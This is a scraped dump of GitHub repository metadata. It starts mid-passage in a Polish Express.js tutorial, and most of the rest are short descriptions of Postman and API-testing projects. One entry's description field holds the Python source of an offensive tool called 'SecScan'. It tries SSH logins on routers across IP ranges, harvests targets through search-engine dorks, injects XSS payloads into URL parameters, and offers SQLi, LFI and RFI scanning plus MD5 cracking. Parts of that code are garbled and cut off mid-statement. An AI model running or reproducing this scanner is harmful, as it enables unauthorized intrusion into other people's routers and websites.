(:) przed nazwę. W naszym przykładzie endpoint będzie więc wyglądał następująco:  /:id Zmieńmy jeszcze odpowiedź z Hello world na 'Identyfikator, który został dopisany to ' + req.params.id.  Czym jest req.params.id? req jest obiektem reprezentującym zapytanie HTTP (ang. request). Posiada on różne parametry, jak na przykład body (czyli ciało zapytania), nagłówki HTTP oraz parametry (params), które mamy zamiar odczytać.  Parametr, który wstawiliśmy jako część adresu w metodzie GET, przekazujemy jako id. W poniższym przypadku wyświetli się komunikat Identyfikator który został dopisany to 123, o ile zapytanie wysłano na adres http://localhost:3000/123.   Popróbuj z różnymi innymi parametrami i sprawdź czy aplikacja działa tak, jak tego oczekujesz.  Obsługa błędu 404 za pomocą ExpressJS Co jeśli serwer nie rozpozna żądania? W Expressie odpowiedź 404 nie jest wynikiem błędu, więc nie jest wyłapywany w trakcie działania aplikacji. Spowodowane jest to tym, że 404 zwykle oznacza brak możliwości wykonania danej czynności, a nie błąd występujący z powodu jakiejś 'wpadki' programisty. Innymi słowy, Express wykonał wszystkie funkcje middleware (które poznamy w kolejnym rozdziale) oraz route'y i dopiero wtedy dowiedział się, że żaden z nich nie odpowiedział na żądanie - taki przypadek możemy obsłużyć poprzez dodanie funkcji middleware na samym końcu (poniżej pozostałych funkcji), aby obsługiwała status 404.  Powróćmy znów do poprzedniego szablonu z metodą GET na stronę domową ('/'), która zwraca nam Hello world!. Dopiszmy teraz metodę middleware, która obsłuży nam błąd 404.  Na samym końcu, poniżej fragmentu z nasłuchiwaniem dodajmy obsługę odpowiedzi 404:  app.use(function (req, res, next) {     res.status(404).send('Wybacz, nie mogliśmy odnaleźć tego, czego żądasz!') }); Po ponownym uruchomieniu skryptu, w przeglądarce powinieneś zobaczyć Hello world!. Spróbuj teraz dopisać coś na koniec adresu (tak jak w poprzednim rozdziale dopisaliśmy id). Powinieneś otrzymać następujący komunikat:   Parametr next, który przekazujemy do funkcji jest funkcją, która pozwala “iść dalej\" do kolejnej funkcji middleware lub zakończenia żądania.  Można w ten sposób stworzyć także obsługę pozostałych błędów. Najczęściej obsługiwane błędy to:  400 - bad request - występuje gdy serwer nie może przetworzyć zapytania 401 - unauthorized - występuje gdy wymagane jest uwierzytelnienie, a nie zostało dostarczone 403 - forbidden - żądanie jest poprawne, jednak serwer odmawia odpowiedzi, może to wystąpić w przypadku gdy np. użytkownik jest zalogowany ale nie ma uprawnień do wykonania żądania 404 - not found - zasoby nie zostały znalezione 500 - internal server error - występuje gdy występują nieznane warunki i nie ma żadnej konkretnej wiadomości Zadanie: Operacje CRUD na pliku JSON Stwórzmy teraz aplikację, która będzie otwierać zewnętrzne pliki .json oraz edytować je. Zanim zaczniemy, w folderze projektu stwórz plik server.js, a następnie zainicjalizuj projekt poprzez wpisanie npm init w konsoli.  Przejdźmy do pobrania potrzebnych zależności - tym razem będzie nam potrzebny Express oraz body-parser. Jak się zapewne domyślasz, możesz zainstalować je za pomocą komendy npm install --save express body-parser. Po pobraniu paczek, możemy śmiało przejść do pisania kodu - na początek przypisz zależności do zmiennych w pliku server.js. Dodaj także linijkę var fs = require('fs') - fs będzie nam potrzebny do operacji na plikach. Nie musimy go instalować, bo jest on wbudowany w Node :)  Skoro zależności mamy już załatwione, zadeklaruj zmienną app, która wywoła funkcję express() oraz zmienną stringifyFile (na razie bez zadeklarowanej wartości).  Tuż pod deklaracją zmiennych dodaj także linijkę app.use(bodyParser.json()); - to pozwoli Ci wykorzystać middleware body-parser, które zainstalowaliśmy przed chwilą. body-parser jest nam potrzebny, aby korzystać z formatu application/json - póki co nie przejmuj się pojęciem middleware, zajmiemy się nim nieco dalej w tym kursie :)  Stwórz teraz endpoint GET /getNote, gdzie po wywołaniu zostanie wczytany Twój zewnętrzny plik JSON oraz wyświetlona zostanie jego zawartość. Przykłądowy plik test.json:  {\"menu\": {    \"id\": \"file\",    \"value\": \"File\",    \"popup\": {      \"menuitem\": [        {\"value\": \"New\", \"onclick\": \"CreateNewDoc()\"},        {\"value\": \"Open\", \"onclick\": \"OpenDoc()\"},        {\"value\": \"Close\", \"onclick\": \"CloseDoc()\"}      ]    }  }} Metoda która pozwoli nam na odczytanie pliku to readFile, którą można wywołać z zadeklarowanego wcześniej fs. Jako parametry przyjmuje ona najpierw plik, następnie opcje (np. kodowanie) i funkcję, która wywoła się po załadowaniu. W naszym przypadku będzie to więc następujący kod: fs.readFile('./test.json', 'utf8', function(err, data) {     if (err) throw err;     stringifyFile = data     res.send(data); }); Teraz pora na stworzenie endpointa, który po wywołaniu nadpisze nam podany plik. Stworzymy do tego dynamiczny endpoint, który dopisze do pliku string, który przekażemy jako parametr. Stwórz tym razem POST na /updateNote/:note. Po jego wywołaniu tekst, który znajduje się w miejscu /:note powinniśmy dopisać do wczytanego pliku poprzez dodanie req.params.note do zmiennej stringifyFile, która przechowuje aktualną zawartość pliku.  Po przypisaniu powyższej zmiennej, należy ponownie odwołać się do modułu fs tym razem używając metody writeFile. Pomoże nam w tym następujący fragment kodu:  fs.writeFile('./test.json', stringifyFile, function(err) {     If (err) throw err;     console.log('file updated'); }); Na końcu pliku dodaj nasłuchiwanie na porcie 3000.  Zapisz plik i uruchom aplikację wpisując node server.js w konsoli.  Otwórz Postmana, ustaw metodę zapytania na GET, a w pole adresu wpisz http://localhost:3000/getNote. Jako response powinieneś otrzymać Twój stworzony wcześniej plik JSON. Po zmianie z GET na POST oraz wpisaniu /updateNote/test zamiast /getNote oraz wysłaniu requesta, Twój plik JSON powinien zostać zaktualizowany o słowo test :)  Po ukończeniu zadania, wrzuć swój kod na Githuba i przekaż link do repozytorium mentorowi :)  Podgląd zadania  https://github.com/martinproxy0/Zadanie_17_3.git   Wyslij link  17.4. Serwowanie plików statycznych Express posiada wbudowaną możliwość serwowania plików statycznych - takimi plikami są na przykład obrazki, pliki CSS czy JS. Aby serwować te pliki statycznie, wystarczy użyć express.static. Pliki statyczne to pliki, które zostają dostarczone do klienta bez generowania, modyfikacji czy przetwarzania - jedyne, co trzeba z nimi zrobić, to przekazać nazwę katalogu, w którym są przetrzymywane, do express.static - to wystarczy aby zacząć je serwować. Spróbujmy przedstawić to sobie na przykładzie.  Załóżmy, że przetrzymujesz swoje zdjęcia i pliki CSS w katalogu assets/. Aby zacząć je serwować, możesz więc użyć następującej linijki:  app.use(express.static('assets')); Zmodyfikujmy więc całkowicie naszą aplikację. Najpierw stwórzmy w katalogu projektu nowy katalog o nazwie assets/. Wrzućmy do niego jakiekolwiek zdjęcie/obrazek. W pliku server.js wróćmy do poprzedniego stanu (zanim zaczęliśmy zajmować się routingiem):  var express = require('express'); var app = express();  app.get('/', function (req, res) {     res.send('Hello world'); });  var server = app.listen(3000, 'localhost', function() {     var host = server.address().address;     var port = server.address().port;      console.log('Przykładowa aplikacja nasłuchuje na http://' + host + ':' + port); }); W tym przykładzie sami definiujemy port i adres, ale w prawdziwej aplikacji moglibyśmy tych wartości nie znać. Częstym przykładem jest sytuacja w której adres i port są zdefiniowane w osobnym pliku konfiguracyjnym. Ten plik byłby inny na naszym komputerze niż na serwerze na którym będziemy publikować aplikację - ale nasz kod ma działać w obu lokalizacjach. Dlatego do wyświetlenia linka potrzebowalibyśmy pobrania tych danych za pomocą metody .address().  Pozostaje teraz jedynie w linii nr 3 dodać to, o czym powiedzieliśmy sobie chwilkę temu, czyli linijkę app.use(express.static('assets'));  Dla przypomnienia, w nawiasach do express.static przekazujemy katalog, w którym znajdują się pliki, które chcemy serwować. Po zapisaniu pliku server.js, możemy uruchomić aplikację. Teraz, aby zobaczyć nasz obrazek, wystarczy że po http://localhost:3000/ podamy nazwę pliku z rozszerzeniem - u mnie wygląda to tak:   Stwórz sobie teraz prosty plik index.html, który będzie miał formularz z dwoma inputami typu text (o nazwach first_name i last_name) oraz jednym typu submit. Element  posiada atrybuty takie jak action oraz method. Atrybut action pozwala określić, gdzie wysłać dane z formularza w momencie, gdy zostanie on zatwierdzony. W naszym przypadku będzie to http://localhost:3000/userform. Atrybut method określa metodę, jakiej chcemy użyć - w naszym przypadku niech będzie to GET.  Przykładowo, Twój index.html może wyglądać tak:                          Node Hello world example                                                 First Name:                                            Last Name:                                           Gdy już będzie gotowy, wrzuć go do katalogu /assets.  Teraz czas na modyfikację pliku server.js. Najpierw zmieńmy to, co chcemy wysyłać, gdy zostanie wysłane żądanie do strony domowej.  Zamień więc res.send('Hello world') na res.sendFile('/index.html') - jak się zapewne domyślasz, res.sendFile() wysyła w odpowiedzi plik zamiast wiadomości.  Musimy również dodać obsługę żądania na endpoint, do którego będziemy kierować nasz formularz.  app.get('/userform', function (req, res) {     const response = {         first_name: req.query.first_name,         last_name: req.query.last_name     };     res.end(JSON.stringify(response)); }); W czasie przetwarzania żądania, tworzymy nowy obiekt response, który ma klucze first_name oraz last_name. Do poszczególnych właściwości przypisujemy dane, które otrzymujemy w obiekcie req (od ang. request), czyli w obiekcie z żądaniem. Na koniec wyświetlamy nasz obiekt przetworzony na typ string za pomocą metody JSON.stringify. Po zapisaniu pliku server.js, aplikacja powinna pokazywać formularz, jak poniżej.   Po wpisaniu wartości do inputów i wysłaniu ich, powinieneś zostać przekierowany do strony /userform, a po znaku zapytania powinny zostać wyświetlone parametry umieszczone przez Ciebie w inputach.   Zadanie: Żonglujemy danymi pomiędzy endpointami Napisz kod obsługujący formularz zgodnie z wskazówkami z tego submodułu, a następnie wyślij swój kod na repozytorium oraz przekaż go do sprawdzenia mentorowi.  Podgląd zadania  https://github.com/martinproxy0/Zadanie_17_4.git   Wyslij link 17.5. Middleware - pośrednik między żądaniem a odpowiedzią","fork":false,"created_at":"2018-01-26T19:03:05Z","updated_at":"2018-01-26T19:03:38Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":13038633,"owner_login":"martinproxy0","owner_avatar_url":"https://avatars2.githubusercontent.com/u/13038633?v=4","pulled":1,"tags":["test","repo","data","request","form","file","application","server","call","node","json","http","user","develop","express","auto","example","automat","implement","format"," express","auth","endpoint","framework","route","https","function","demo","send","local","list","star","source","read","front","update","response","stat","host","start","delete","face","package","method","info","developer","system","name","html","action","module","program","infor","github","model","tech","esse","text","getpost","problem","install","parse","link","proxy","folder","status","require","middleware","parser","console","intern","note","popular","party","write","query","sets","updated","dynamic","modules","routing","role","world","address","dependencies","found","error","internal","listen","jest","kurs","rake","ekspresowe","kazan","wars"]},{"id":17645181,"name":"aa.py","full_name":"udinparla/aa.py","description":"#!/usr/bin/env python import re import hashlib import Queue from random import choice import threading import time import urllib2 import sys import socket  try:     import paramiko      PARAMIKO_IMPORTED = True except ImportError:     PARAMIKO_IMPORTED = False    USER_AGENT = [\"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3\",              \"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7\",              \"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\",              \"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)\",              \"YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)\", \t     \"Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/535.38.6 (KHTML, like Gecko) Version/5.1 Safari/535.38.6\", \t     \"Mozilla/5.0 (Macintosh; U; U; PPC Mac OS X 10_6_7 rv:6.0; en-US) AppleWebKit/532.23.3 (KHTML, like Gecko) Version/4.0.2 Safari/532.23.3\"             ] option = ' ' vuln = 0 invuln = 0 np = 0 found = []   class Router(threading.Thread):     \"\"\"Checks for routers running ssh with given User/Pass\"\"\"     def __init__(self, queue, user, passw):         if not PARAMIKO_IMPORTED:             print 'You need paramiko.'             print 'http://www.lag.net/paramiko/'             sys.exit(1)         threading.Thread.__init__(self)              self.queue = queue          self.user = user         self.passw = passw       def run(self):         \"\"\"Tries to connect to given Ip on port 22\"\"\"         ssh = paramiko.SSHClient()         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())         while True:             try:                 ip_add = self.queue.get(False)              except Queue.Empty:                 break             try:                 ssh.connect(ip_add, username = self.user, password = self.passw, timeout = 10)                 ssh.close()                 print \"Working: %s:22 - %s:%s\\n\" % (ip_add, self.user, self.passw)                 write = open('Routers.txt', \"a+\")                 write.write('%s:22 %s:%s\\n' % (ip_add, self.user, self.passw))                 write.close()                   self.queue.task_done()              except:                 print 'Not Working: %s:22 - %s:%s\\n' % (ip_add, self.user, self.passw)                 self.queue.task_done()                               class Ip:     \"\"\"Handles the Ip range creation\"\"\"     def __init__(self):         self.ip_range = []         self.start_ip = raw_input('Start ip: ')         self.end_ip = raw_input('End ip: ')         self.user = raw_input('User: ')         self.passw = raw_input('Password: ')         self.iprange()             def iprange(self):         \"\"\"Creates list of Ip's from Start_Ip to End_Ip\"\"\"         queue = Queue.Queue()         start = list(map(int, self.start_ip.split(\".\")))         end = list(map(int, self.end_ip.split(\".\")))         tmp = start                 self.ip_range.append(self.start_ip)         while tmp != end:             start[3] += 1             for i in (3, 2, 1):                 if tmp[i] == 256:                     tmp[i] = 0                     tmp[i-1] += 1             self.ip_range.append(\".\".join(map(str, tmp)))                 for add in self.ip_range:             queue.put(add)          for i in range(10):             thread = Router(queue, self.user, self.passw )             thread.setDaemon(True)             thread.start()          queue.join()   class Crawl:     \"\"\"Searches for dorks and grabs results\"\"\"     def __init__(self):         if option == '4':             self.shell = str(raw_input('Shell location: '))         self.dork = raw_input('Enter your dork: ')         self.queue = Queue.Queue()         self.pages = raw_input('How many pages(Max 20): ')         self.qdork = urllib2.quote(self.dork)         self.page = 1         self.crawler()         def crawler(self):         \"\"\"Crawls Ask.com for sites and sends them to appropriate scan\"\"\"         print '\\nDorking...'         for i in range(int(self.pages)):             host = \"http://uk.ask.com/web?q=%s&page=%s\" % (str(self.qdork), self.page)             req = urllib2.Request(host)             req.add_header('User-Agent', choice(USER_AGENT))             response = urllib2.urlopen(req)             source = response.read()             start = 0             count = 1             end = len(source)             numlinks = source.count('_t\" href', start, end)               while count alert('xssBYm0le');\"\"\"         self.file = 'xss.txt'       def run(self):         \"\"\"Checks Url for possible Xss\"\"\"         while True:             try:                 site = self.queue.get(False)             except Queue.Empty:                 break             if '=' in site:                 global vuln                 global invuln                 global np                 xsite = site.rsplit('=', 1)[0]                 if xsite[-1] != \"=\":                     xsite = xsite + \"=\"                 test = xsite + self.xchar                 try:                     conn = urllib2.Request(test)                     conn.add_header('User-Agent', choice(USER_AGENT))                     opener = urllib2.build_opener()                     data = opener.open(conn).read()                 except:                     self.queue.task_done()                 else:                     if (re.findall(\"xssBYm0le\", data, re.I)):                         self.xss(test)                         vuln += 1                     else:                         print B+test + W+' > ' + str(vuln) + G+' Vulnerable Sites Found' + W     print '>> ' + str(invuln) + G+' Sites Not Vulnerable' + W     print '>> ' + str(np) + R+' Sites Without Parameters' + W     if option == '1':         print '>> Output Saved To sqli.txt\\n'     elif option == '2':         print '>> Output Saved To lfi.txt'     elif option == '3':         print '>> Output Saved To xss.txt'     elif option == '4':         print '>> Output Saved To rfi.txt'     W  = \"\\033[0m\";   R  = \"\\033[31m\";  G  = \"\\033[32m\";  O  = \"\\033[33m\";  B  = \"\\033[34m\";  def main():     \"\"\"Outputs Menu and gets input\"\"\"     quotes = [ \t'\\nm0le@tormail.org\\n'         ]     print (O+''' ------------- -- SecScan -- --- v1.5 ---- ---- by ----- --- m0le ---- -------------''')     print (G+''' -[1]-  SQLi -[2]-  LFI -[3]-  XSS -[4]-  RFI -[5]-  Proxy -[6]-  Admin Page Finder -[7]-  Sub Domain Scan -[8]-  Dictionary MD5 cracker -[9]-  Online MD5 cracker -[10]- Check your IP address''')      print (B+''' -[!]- If freeze while running or want to quit,  just Ctrl C, it will automatically terminate the job. ''')     print W     global option     option = raw_input('Enter Option: ')       if option:         if option == '1':             Crawl()             output()             print choice(quotes)                      elif option == '2':             Crawl()             output()             print choice(quotes)           elif option == '3':             Crawl()             output()             print choice(quotes)           elif option == '4':             Crawl()             output()             print choice(quotes)               elif option == '5':             Ip()             print choice(quotes)           elif option == '6':             admin()             aprint()             print choice(quotes)          elif option == '7':             subd()             print choice(quotes)          elif option == '8':             word()             print choice(quotes)            elif option == '9':             OnlineCrack().crack()             print choice(quotes)                              elif option == '10':             Check().grab()               print choice(quotes)                 else:             print R+'\\nInvalid Choice\\n' + W             time.sleep(0.9)             main()           else:         print R+'\\nYou Must Enter An Option (Check if your typo is corrected.)\\n' + W         time.sleep(0.9)         main()     if __name__ == '__main__':     main()","fork":false,"created_at":"2014-03-11T20:35:08Z","updated_at":"2019-11-23T18:43:58Z","stargazers_count":4,"watchers_count":4,"forks":0,"watchers":4,"score":1,"owner_id":6923150,"owner_login":"udinparla","owner_avatar_url":"https://avatars0.githubusercontent.com/u/6923150?v=4","pulled":1,"tags":["test","data","file","call","http","user","auto","automat","mail","line","help","route","build","send","list","site","star","source","read","import","running","response","host","start","python","connect","need","shop","name","html","task","search","open","print","result","main","class","automatic","link","header","results","creation","done","find","given","automatically","many","write","location","free","router","output","gets","sends","correct","while","address","pages","found","admin","reading","google","random","seek","crawler","grab"]},{"id":191496578,"name":"API-Test-Lib","full_name":"Krishank/API-Test-Lib","description":"As we all know POSTMAN is a very powerful tool for API Testing this is a Simple POC for proving how can we use postman for API testing, export it collection dynamically and run it from any CI tool","fork":false,"created_at":"2019-06-12T04:18:44Z","updated_at":"2019-09-10T01:28:08Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":7191100,"owner_login":"Krishank","owner_avatar_url":"https://avatars3.githubusercontent.com/u/7191100?v=4","pulled":1,"tags":["test"," postman","collect","collection","testing","tool","call","export","very","dynamic","powerful","dynamically","proving"]},{"id":92730231,"name":"performance-load-test","full_name":"mohamed-abdo/performance-load-test","description":"Performance parallel load test ecosystem based on running postman collections in parallel in addition to capture test performance counters, and unit tests results; Exporting all results to (local) data store (sql express).","fork":false,"created_at":"2017-05-29T10:38:02Z","updated_at":"2017-07-03T10:48:18Z","stargazers_count":1,"watchers_count":1,"forks":0,"watchers":1,"score":1,"owner_id":92772,"owner_login":"mohamed-abdo","owner_avatar_url":"https://avatars2.githubusercontent.com/u/92772?v=4","pulled":1,"tags":["test"," postman","collect","collection","collections","data","postman collection","form","tests","tests ","based","express"," express","postman collections","load","local","running","perform","system","store","result","unit","results","parallel","performance","ecosystem"]},{"id":151845230,"name":"DataBaseTestProject","full_name":"Mattcat1995/DataBaseTestProject","description":"Goal of the project is to get a Django connection to a SQL database and test the methods with postman","fork":false,"created_at":"2018-10-06T13:58:21Z","updated_at":"2018-10-06T13:58:11Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":42643837,"owner_login":"Mattcat1995","owner_avatar_url":"https://avatars3.githubusercontent.com/u/42643837?v=4","pulled":1,"tags":["test"," postman","data","database","connect","method","methods","connection"]},{"id":214589411,"name":"authentication","full_name":"saynegrojas/authentication","description":"Authentication using JWT. Mongodb Atlas for database, and Postman to test routes.","fork":false,"created_at":"2019-10-12T06:14:38Z","updated_at":"2019-10-12T06:42:07Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":11191805,"owner_login":"saynegrojas","owner_avatar_url":"https://avatars3.githubusercontent.com/u/11191805?v=4","pulled":1,"tags":["test","data","database","route","routes"]},{"id":249724934,"name":"webshop-back-config","full_name":"fdmeregildo/webshop-back-config","description":"docker file, database file, integration testing, readme example, postman file, others","fork":false,"created_at":"2020-03-24T14:08:00Z","updated_at":"2020-03-24T14:09:52Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":15707963,"owner_login":"fdmeregildo","owner_avatar_url":"https://avatars3.githubusercontent.com/u/15707963?v=4","pulled":1,"tags":["test"," postman","data","testing","file","database","example","integration","read","docker","readme"]},{"id":63431943,"name":"NoSql_DocumentDB_Admin","full_name":"Apollo013/NoSql_DocumentDB_Admin","description":"A WebApi (OWIN) demonstrating how to manage DocumentDB Databases, Collections, Documents & Users/Permissions. Requires Fiddler or POSTMAN to test.","fork":false,"created_at":"2016-07-15T15:26:04Z","updated_at":"2016-10-26T19:44:29Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":9936358,"owner_login":"Apollo013","owner_avatar_url":"https://avatars1.githubusercontent.com/u/9936358?v=4","pulled":1,"tags":["test","manage","demo","rating","demonstrating"]},{"id":101328791,"name":"GraphLearningAPI","full_name":"ayuscode/GraphLearningAPI","description":"A simple API with ASP .NET Core and SQLite database. Use the Postman environment to test API","fork":false,"created_at":"2017-08-24T19:06:01Z","updated_at":"2017-08-24T19:52:31Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":6653967,"owner_login":"ayuscode","owner_avatar_url":"https://avatars1.githubusercontent.com/u/6653967?v=4","pulled":1,"tags":["test","data","database","environment"]},{"id":145154752,"name":"mongotut","full_name":"Greg1992/mongotut","description":"Server set up to communicate with a MongoDB database, using modern security measures to encrypt data. Used POSTMAN and Node testing packages (Mocha and Chai)","fork":false,"created_at":"2018-08-17T18:37:07Z","updated_at":"2018-10-26T12:35:16Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":37276159,"owner_login":"Greg1992","owner_avatar_url":"https://avatars2.githubusercontent.com/u/37276159?v=4","pulled":1,"tags":["test","data","testing","database","package","communicate","packages","security","modern"]},{"id":184118378,"name":"command-line-physician","full_name":"command-line-physician/command-line-physician","description":"Our intention with this app is to let users find natural herbal based remedies for their ailments. Our app allows users to browse our specially curated herb database by name and latin name. Command-Line Physician also allows users to locate the nearest store where they can find their unique remedy, or a local resident who has the herb available to share. Tech stack: Command-line Physician is a RESTful api that utilizes Node, Express, Jest, end-to-end and unit testing. Our testing was carried out by Compass, Robo 3T, and Postman.","fork":false,"created_at":"2019-04-29T17:57:06Z","updated_at":"2019-05-29T23:32:24Z","stargazers_count":0,"watchers_count":0,"forks":4,"watchers":0,"score":1,"owner_id":50116559,"owner_login":"command-line-physician","owner_avatar_url":"https://avatars3.githubusercontent.com/u/50116559?v=4","pulled":1,"tags":["test","data","testing","rest","database","user","based","line","util","spec","local","users","store","name","side","allows","stack","unit","available","find","utilizes","intention"]},{"id":242344409,"name":"Saral-clone-with-SQL-Quries","full_name":"prince21298/Saral-clone-with-SQL-Quries","description":"In this project I have write Saral-like-API by use of SQLite database. I have create saral.db database in this database create three table 1.courses 2.exercise 3.submissions this project we can test on postman also use express module in this project.","fork":false,"created_at":"2020-02-22T13:15:09Z","updated_at":"2020-02-22T13:18:59Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":46297619,"owner_login":"prince21298","owner_avatar_url":"https://avatars1.githubusercontent.com/u/46297619?v=4","pulled":1,"tags":["test"," postman","create","data","database","express"," express","course","module","write","three","exercise"]},{"id":227783010,"name":"task-manager-api","full_name":"Shaykoo/task-manager-api","description":"This app is purely based on NodeJS. This app is a task manager app which stores all the users and their tasks in MongoDB database with required authentication of the user to create, read, update and delete the users and their own particular tasks plus when a user gets created or deleted the app sends them email to notify. Use the website address to test it on postman. Get authenticated before using the app on postman.","fork":false,"created_at":"2019-12-13T07:35:57Z","updated_at":"2020-01-13T15:06:20Z","stargazers_count":1,"watchers_count":1,"forks":0,"watchers":1,"score":1,"owner_id":34743587,"owner_login":"Shaykoo","owner_avatar_url":"https://avatars2.githubusercontent.com/u/34743587?v=4","pulled":1,"tags":["test"," postman","create","data","database","user","based","mail","auth","manage","send","site","read","authentication","users","update","delete","email","website","store","task","require","tasks","authenticate","gets","sends","required","pure","address","authenticated","manager","notify","purely"]},{"id":87771466,"name":"Mean-Hotel","full_name":"regeanish/Mean-Hotel","description":"Created a Hotel API where user can add, delete, update hotel name and reviews using NodeJS(Express) and MongoDB. Used RESTful API HTTP client POSTMAN for testing.  Additionally,  building UI for displaying information coming from the server & database about the hotel using AngularJS","fork":false,"created_at":"2017-04-10T05:50:10Z","updated_at":"2017-08-21T03:13:03Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":17118506,"owner_login":"regeanish","owner_avatar_url":"https://avatars3.githubusercontent.com/u/17118506?v=4","pulled":1,"tags":["test","data","testing","form","server","client","database","user","format","build","update","view","delete","info","play","name","infor","information","building","review","display","playing","reviews","hotel"]},{"id":140987980,"name":"face-recognition-api","full_name":"shijiahu/face-recognition-api","description":"- Built a facial recognition system, using React.js as front-end, Node.js and Express.js as back-end server, PostgreSQL as database, Postman as testing tool - Enabling sign up/sign in, recognize face from images features - Deployed the app to Heroku","fork":false,"created_at":"2018-07-15T00:49:09Z","updated_at":"2018-11-06T00:21:49Z","stargazers_count":0,"watchers_count":0,"forks":1,"watchers":0,"score":1,"owner_id":23464077,"owner_login":"shijiahu","owner_avatar_url":"https://avatars0.githubusercontent.com/u/23464077?v=4","pulled":1,"tags":["test","data","testing","tool","server","database","sign","front","image","face","system","feature","features","images","recognition","facial","sign up"]},{"id":140487882,"name":"face-recognition","full_name":"shijiahu/face-recognition","description":"- Built a facial recognition system, using React.js as front-end, Node.js and Express.js as back-end server, PostgreSQL as database, Postman as testing tool - Enabling sign up/sign in, recognize face from images features - Deployed the app to Heroku","fork":false,"created_at":"2018-07-10T21:13:56Z","updated_at":"2018-11-05T23:53:49Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":23464077,"owner_login":"shijiahu","owner_avatar_url":"https://avatars0.githubusercontent.com/u/23464077?v=4","pulled":1,"tags":["test","data","testing","tool","server","database","sign","front","image","face","system","feature","features","images","recognition","facial","sign up"]},{"id":201312005,"name":"food-delivery-server-goit","full_name":"SerhiiY/food-delivery-server-goit","description":"A course task with using node.js server. All queries were tested by Postman. App can give products list or user by id and write a new product or user to the database. On master branch used http module, on express-hw branch express.js is used.","fork":false,"created_at":"2019-08-08T18:06:53Z","updated_at":"2019-09-10T10:36:12Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":34281627,"owner_login":"SerhiiY","owner_avatar_url":"https://avatars0.githubusercontent.com/u/34281627?v=4","pulled":1,"tags":["test","data","server","node","database","http","user","express"," express","tested","list","course","task","module","product","were","queries","products","write","master"]},{"id":251235921,"name":"AutomatedAPITesting","full_name":"djcruz93/AutomatedAPITesting","description":"Automate the process of api testing using circleCI and postman","fork":false,"created_at":"2020-03-30T07:45:47Z","updated_at":"2020-03-30T09:08:27Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":51796498,"owner_login":"djcruz93","owner_avatar_url":"https://avatars3.githubusercontent.com/u/51796498?v=4","pulled":1,"tags":["test"," postman","testing","process"]},{"id":190750603,"name":"automated-swtesting-withpy","full_name":"HuGomez/automated-swtesting-withpy","description":"Learning about automated software testing with Python, BDD, Selenium WebDriver, and Postman, focusing on web applications","fork":false,"created_at":"2019-06-07T13:46:17Z","updated_at":"2019-06-10T22:59:35Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":2131526,"owner_login":"HuGomez","owner_avatar_url":"https://avatars3.githubusercontent.com/u/2131526?v=4","pulled":1,"tags":["test","testing","application","auto","automat","automate","web app","automated","applications","software","river"]},{"id":117685246,"name":"dockerized-newman","full_name":"banzaicloud/dockerized-newman","description":"Automated end-2-end testing with Postman in Docker","fork":false,"created_at":"2018-01-16T13:11:00Z","updated_at":"2019-05-27T18:37:24Z","stargazers_count":1,"watchers_count":1,"forks":0,"watchers":1,"score":1,"owner_id":32848483,"owner_login":"banzaicloud","owner_avatar_url":"https://avatars2.githubusercontent.com/u/32848483?v=4","pulled":1,"tags":["test","testing"]},{"id":174263023,"name":"postman-newman-circleci","full_name":"jordanahaines/postman-newman-circleci","description":"Companion repo for a post on how to use Newmand and CircleCI to schedule automated tests for requests defined in Postman","fork":false,"created_at":"2019-03-07T03:14:56Z","updated_at":"2019-03-07T03:14:59Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":6641613,"owner_login":"jordanahaines","owner_avatar_url":"https://avatars2.githubusercontent.com/u/6641613?v=4","pulled":1,"tags":["test","repo","request","tests","tests ","requests","auto","automat","automate","automated","define","schedule"]},{"id":160708170,"name":"Atanyanta.github.io","full_name":"Atanyanta/Atanyanta.github.io","description":"Quickly generate automated postman tests to ensure data is static and returns correctly","fork":false,"created_at":"2018-12-06T17:22:43Z","updated_at":"2020-02-11T18:11:24Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":42071923,"owner_login":"Atanyanta","owner_avatar_url":"https://avatars1.githubusercontent.com/u/42071923?v=4","pulled":1,"tags":["test"," postman","data","tests","tests ","auto","automat","generate","stat","automate","automated","postman tests","turns","returns","correct"]},{"id":95715939,"name":"test-client","full_name":"Trozdol/test-client","description":"Bare bones client I use just to test APIs as I need. (yes I know about Postman and Curl)","fork":false,"created_at":"2017-06-28T22:11:41Z","updated_at":"2017-06-28T22:16:17Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":202224,"owner_login":"Trozdol","owner_avatar_url":"https://avatars1.githubusercontent.com/u/202224?v=4","pulled":1,"tags":["test","client","need","bones"]},{"id":215697817,"name":"concourceCI-newman-slack","full_name":"karthick-git/concourceCI-newman-slack","description":"This is an API automation framework built using Postman's Newman CLI (Docker image) integrated with Concourse (a CI tool) for continuous testing and automatic slack reporting 